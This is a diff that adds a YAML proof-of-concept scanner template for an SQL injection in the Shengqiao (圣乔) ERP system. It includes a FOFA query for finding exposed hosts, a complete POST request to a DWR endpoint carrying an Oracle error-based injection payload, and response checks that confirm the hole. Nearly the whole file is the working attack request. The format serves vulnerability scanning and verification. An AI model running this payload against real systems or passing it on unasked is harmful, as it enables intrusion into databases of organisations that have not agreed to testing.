@@ -1,0 +1,45 @@
+id: poc-yaml-shengqiao-erp-resultsetconvertor-sqli
+info:
+  name: 圣乔ERP系统 ResultSetConvertor SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 圣乔ERP系统
+  fofa: title="圣乔ERP系统"
+requests:
+- method: POST
+  path: /erp/dwr/call/plaincall/ResultSetConvertor.queryForMapWithDefaultValues.dwr
+  headers:
+    Content-Type: text/plain
+  data: 'callCount=1
+
+    page=/erp/dwr/test/ResultSetConvertor
+
+    httpSessionId=
+
+    scriptSessionId=B4C02555EA992FF3A73F3CCA60389809871
+
+    c0-scriptName=ResultSetConvertor
+
+    c0-methodName=queryForMapWithDefaultValues
+
+    c0-id=0
+
+    c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT
+    (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62)))
+    FROM DUAL)
+
+    c0-param1=Array:[]
+
+    batchId=4'
+  expression: 'status_code == 200 &&
+
+    contains(body,"qjzzq1qvzvq") &&
+
+    contains(body,"SYS.XMLTYPE") &&
+
+    contains(body,"java.sql.SQLException")
+
+    '
+variables: {}
+transport: http
